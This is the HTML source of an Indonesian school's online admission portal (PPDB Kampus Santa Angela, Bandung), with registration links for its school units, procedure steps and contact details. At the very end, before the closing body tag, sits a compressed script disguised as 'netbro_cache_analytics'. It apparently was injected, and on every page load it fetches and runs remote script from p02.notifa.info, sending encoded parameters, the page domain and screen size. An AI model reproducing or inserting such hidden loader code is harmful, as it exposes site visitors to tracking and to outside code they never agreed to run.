


<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>PPDB Online | Kampus Santa Angela Bandung</title>

    <!-- Bootstrap Core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="css/faa.css" rel="stylesheet">

    <!-- Theme CSS -->
    <link href="css/freelancer.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body id="page-top" class="index">  

    <!-- Navigation -->
    <nav id="mainNav" class="navbar navbar-default navbar-fixed-top navbar-custom bxshad">
        <div class="container">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header page-scroll">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                    <span class="sr-only">Toggle navigation</span> Menu <i class="fa fa-bars"></i>
                </button>
                <a class="navbar-brand" href="#page-top"><i class="fa fa-home"></i> PPDB Online</a>
            </div>

            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                <ul class="nav navbar-nav navbar-right">
                    <li class="hidden">
                        <a href="#page-top"></a>
                    </li>
                    <li class="page-scroll">
                        <a href="#portfolio"><i class="fa fa-university"></i> Sekolah</a>
                    </li>
                    <li class="page-scroll">
                        <a href="#about"><i class="fa fa-info-circle"></i> Informasi</a>
                    </li>
                    <li class="page-scroll">
                        <a href="#contact"><i class="fa fa-phone-square"></i> Kontak Kami</a>
                    </li>
                </ul>
            </div>
            <!-- /.navbar-collapse -->
        </div>
        <!-- /.container-fluid -->
    </nav>

    <!-- Header -->
    <header> 
        <div class="container">
            <div class="row">
                <div class="col-lg-12" >
                    <img class="img-responsive" src="img/logo1.png" style="margin-top:-30px;">
                    <div class="intro-text">
                        <span class="name shad" style="font-size:35px">PPDB Kampus Santa Angela</span>
                                                                          
                        <br>
                        <span class="skills"><a href="register.php?unit=S0I=&code=cHBkYnBn" 
                                 class="btn btn-success btn-lg">PPDB KB</a> &nbsp;<a href="register.php?unit=VEs=&code=cHBkYnRr" 
                                 class="btn btn-success btn-lg">PPDB TK</a> &nbsp;<a href="register.php?unit=U0Q=&code=cHBkYnNk" 
                                 class="btn btn-success btn-lg">PPDB SD</a> &nbsp;<a href="register.php?unit=U01Q&code=cHBkYnNtcA==" 
                                 class="btn btn-success btn-lg">PPDB SMP</a> &nbsp;<a href="register.php?unit=U01B&code=cHBkYnNtYQ==" 
                                 class="btn btn-success btn-lg">PPDB SMA</a> &nbsp;
                        <br>
                        <a href="files/Panduan_PPDB_Online_Santa_Angela.pdf" 
                           class="btn btn-primary btn-sm" style="width:300px;"><i class="fa fa-users faa-pulse animated"></i> &nbsp;Download Panduan PPDB Online</a>       
                        </span> 
                        <br> <br>  
                        <hr class="star-light">   
                        
                        <h3>Login Calon Siswa Terdaftar PPDB St. Angela</h3>
                        <span>    
                         <a href="?lpage=bG9naW5zaXN3YQ==" 
                           class="btn btn-success btn-lg" style="width:300px;"><i class="fa fa-users faa-pulse animated"></i> &nbsp;Login Calon Siswa</a><br>
                          
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Portfolio Grid Section -->
    <section id="portfolio">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 text-center">
                    <h2>Unit sekolah</h2>
                    <hr class="star-primary">
                    
                </div>
            </div>
            <div class="row">
                <div class="col-sm-3 portfolio-item">
                    <a href="http://tk.santa-angela.sch.id" target="_blank" class="portfolio-link">
                        <div class="caption">
                            <div class="caption-content">
                                <i class="fa fa-search-plus fa-3x"></i>
                            </div>
                        </div>
                        <img src="img/tk.jpg" class="img-thumbnail" alt=""><br><br>
                        <span class="btn btn-success btn-block">KB-TK St.Angela</span>
                    </a>
                </div>
                <div class="col-sm-3 portfolio-item">
                    <a href="http://sd.santa-angela.sch.id" class="portfolio-link">
                        <div class="caption">
                            <div class="caption-content">
                                <i class="fa fa-search-plus fa-3x"></i>
                            </div>
                        </div>
                        <img src="img/sd.jpg" class="img-thumbnail" alt=""><br><br>
                        <span class="btn btn-success btn-block">SD St.Angela</span>
                    </a>
                </div>
                <div class="col-sm-3 portfolio-item">
                    <a href="http://smp.santa-angela.sch.id" class="portfolio-link">
                        <div class="caption">
                            <div class="caption-content">
                                <i class="fa fa-search-plus fa-3x"></i>
                            </div>
                        </div>
                        <img src="img/smp.jpg" class="img-thumbnail" alt=""><br><br>
                        <span class="btn btn-success btn-block">SMP St.Angela</span>
                    </a>
                </div>
                <div class="col-sm-3 portfolio-item">
                    <a href="http://www.smasantaangela.sch.id" class="portfolio-link" >
                        <div class="caption">
                            <div class="caption-content">
                                <i class="fa fa-search-plus fa-3x"></i>
                            </div>
                        </div>
                        <img src="img/sma.jpg" class="img-thumbnail" alt=""><br><br>
                        <span class="btn btn-success btn-block">SMA St.Angela</span>
                    </a>
                </div>
                
                
               
            </div>
        </div>
    </section>

    <!-- About Section -->
    <section class="success" id="about">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 text-center">
                    <h2>Informasi PPDB</h2>
                    <hr class="star-light">
                </div>
            </div>
            <div class="row">
                <div class="col-lg-4 col-lg-offset-2">
                    <p>Kampus Santa Angela menyediakan PPDB secara <i>online</i> diharapkan proses PPDB dapat berjalan cepat
                    dan bisa dilakukan dimanapun dan kapanpun selama sesi PPDB dibuka. Proses pendaftaran siswa baru tidak menggunakan formulir konvensional hanya dengan mengakses website PPDB Online Kampus Santa Angela. </p>
                </div>
                <div class="col-lg-4">
                    <p>Pengisian form PPDB mohon diperhatikan data yang dibutuhkan yang nantinya akan dipakai dalam proses PPDB. Setelah proses pengisian form PPDB secara online berhasil dilakukan, calon siswa akan mendapat bukti daftar dengan nomor pendaftaran dan harus disimpan yang akan digunakan untuk proses selanjutnya.</p>
                </div>
                <div class="col-lg-8 col-lg-offset-2 text-center page-scroll">
                    <a href="#page-top" class="btn btn-md btn-outline">
                        <i class="fa fa-pencil-square-o "></i> PPDB Online
                    </a> &nbsp;&nbsp;
                    <a href="#prosedur" class="btn btn-md btn-outline">
                        <i class="fa fa-tasks"></i> Prosedur PPDB Online
                    </a>&nbsp;&nbsp;
                    <a href="?lpage=bG9naW5zaXN3YQ==" class="btn btn-md btn-outline">
                        <i class="fa fa-sign-in"></i> Login Calon Siswa
                    </a>&nbsp;&nbsp;
                    
                </div>
            </div>
        </div>
    </section>
    
     <section id="prosedur">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 text-center">
                    <h2>Prosedur PPDB Online</h2>
                    <hr class="star-primary">
                </div>
            </div>
            <div class="row">
                <div class="col-lg-12" style="margin-top:-10px;">
                    <div class="col-md-2"></div>
                    <div class="col-md-8">
                       <img class="img-responsive" src="img/alur_new.jpg" alt=""> 
                    </div>   
                    <div class="col-md-2"></div>                                                     
                    <div class="row">
                        <div class="col-lg-8 col-lg-offset-2">
                            <div class="col-lg-12 text-center">
                                <h4>Penjelasan Prosedur PPDB Online</h4>
                                <hr class="star-primary">  
                                <ol style="font-size:18px;text-align:justify">                                
                                <li> Calon Siswa mendaftarkan diri atau melakukan registrasi PPDB <i>online</i> melalui website PPDB Kampus Santa Angela</li>
                                <li>Setelah Calon Siswa berhasil melakukan pendaftaran atau registrasi, Calon siswa akan mendapatkan bukti registrasi yang berisi <b>nomor pendaftaran</b> dan <b>password</b>  harus disimpan yang nantinya akan dipakai untuk akses ke sistem PPDB Kampus Santa Angela.</li>  
                                <li>Calon siswa wajib menyerahkan dokumen-dokumen yang diminta oleh Panitia PPDB sebagai persyaratan administrasi. </li>
                                <li>Setelah proses registrasi dan pembayaran biaya PPDB dilakukan, maka para calon siswa mengirimkan berkas-berkas yang dibutuhkan oleh panitia PPDB yang nantinya akan digunakan sebagai bahan verifikasi dan penyeleksian. Dokumen yang perlu disertakan saat diserahkan kepada panitia PPDB dapat dilihat melalui login ke halaman Calon Siswa</li>                            
                                <li>Panitia PPDB melakukan verifikasi data Calon Siswa. Kemudian Calon Siswa mengikuti tes seleksi penerimaa siswa baru.</li>
                                <li>Panitia PPDB mengumumkan hasil seleksi siswa yang diterima dan melakukan daftar ulang guna melengkapi kelengkapan administrasi.</li>
                                <li>Untuk mendapatkan informasi yang berkaitan dengan pross PPDB, calon siswa harus login terlebih dahulu dengan menggunakan No.Registrasi dan password yang sudah didapatkan saat registrasi online.</li>
                              </ol>
                            </div>
                           
                              
                            
                        </div>               
                    </div>                   
                </div>
            </div>
        </div>
    </section>

    <!-- Contact Section -->
    <section class="success" id="contact">
        <div class="container ">
            <div class="row">
                <div class="col-lg-12 text-center">
                    <h2>Kontak Kami</h2>
                    <hr class="star-light">
                    <h4>Jalan Merdeka No.24 Bandung, 40117<br>
                        Jawa Barat, Indonesia <br><br></h4>
                </div>
            </div>
            <div class="row">
                <div class="col-sm-3">
                    <h4 class="btn btn-success">TB-TK St. Angela</h4>
                    <h5><i class="fa fa-phone-square"></i> 022-4222590</h5>
                    <h5><i class="fa fa-fax"></i> 022-4222582</h5>
                    <span class="eml"><i class="fa fa-envelope"></i> ppdb.kb@gmail.com</span><br>
                    <span class="eml"><i class="fa fa-envelope"></i> ppdb.tk@gmail.com</span>
                </div>
                <div class="col-sm-3">
                    <h4 class="btn btn-success">SD St. Angela</h4>
                    <h5><i class="fa fa-phone-square"></i> 022-4214736</h5>
                    <h5><i class="fa fa-fax"></i> 022-4222590</h5>
                    <span class="eml"><i class="fa fa-envelope"></i> ppdbsdsantaangela@gmail.com</span> 
                </div>
                <div class="col-sm-3">
                  <h4 class="btn btn-success">SMP St. Angela</h4>
                  <h5><i class="fa fa-phone-square"></i> 022-4214715</h5>
                  <h5><i class="fa fa-fax"></i> 022-4222578</h5>
                  <span class="eml"><i class="fa fa-envelope"></i> ppdb.stangelabdg@gmail.com</span> 
                </div>
                <div class="col-sm-3">
                    <h4 class="btn btn-success">SMA St. Angela</h4>
                    <h5><i class="fa fa-phone-square"></i> 022-4214714</h5>
                    <h5><i class="fa fa-fax"></i> 022-4222587</h5>
                     <span class="eml"><i class="fa fa-envelope"></i> ppdb.smaangela@gmail.com</span>
                    
                </div>

            </div>
        </div>
    </section>
    
   

    <!-- Footer -->
    <footer class="text-center">
        
        <div class="footer-below">
            <div class="container">
                <div class="row">
                    <div class="col-lg-12">
                        Copyright &copy; Kampus Santa Angela 2017 | IT Development
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <!-- Scroll to Top Button (Only visible on small and extra-small screen sizes) -->
    <div class="scroll-top page-scroll hidden-sm hidden-xs hidden-lg hidden-md">
        <a class="btn btn-primary" href="#page-top">
            <i class="fa fa-chevron-up"></i>
        </a>
    </div>

   

    <!-- jQuery -->
    <script src="vendor/jquery/jquery.min.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>

    <!-- Plugin JavaScript -->
    <script src="http://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script>

    <!-- Contact Form JavaScript -->
    <script src="js/jqBootstrapValidation.js"></script>
    <script src="js/contact_me.js"></script>

    <!-- Theme JavaScript -->
    <script src="js/freelancer.min.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mao5j43qnoGrdut28Oq%2fbhOZQREAaCDrkL%2fuqiNgQ69%2b4XdmLvUy5LWrqGerzn5Mlqem%2bSHl7zrjG8IYW7kmT10Lu9w9iodms%2fqiFdeFd5JiSqVrQrWBsRgleNkx%2fNQYAcT9%2f0pswd%2bNm1wvWeKmCYujgGdNpuwPYuakRz7Erf6uv15pNcW6wqa3lU1yToIQ5tpHysFNtzWk3eRO1pulpmusB6lNWkXZgRJzevu5NjL%2f6w2Ubn%2bl9E4ctnMaSqXBLnpdPxqkTQUEsrjT9S%2fDM5Fzq7rRR4UCP%2bkm8vSMELA1fqz86oXL5PX%2blhh2XLd1%2bAvCCq%2f4e%2fmOQr%2bHlO%2f2C%2fohyXOfYBC6G9W4ayW1L%2bbn7wkyYQhTjQPnykxcKH9IXy%2b%2fBrkBvCan36h7E2Ue4kY07l8dtyNU02b4aZt7X9bqKCQdFJ%2f9XVWZPKPyWYZupmB8P1m3lEiFwY%2f8A7XavGLFkc4soqnSF4FhRnuTh79g%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>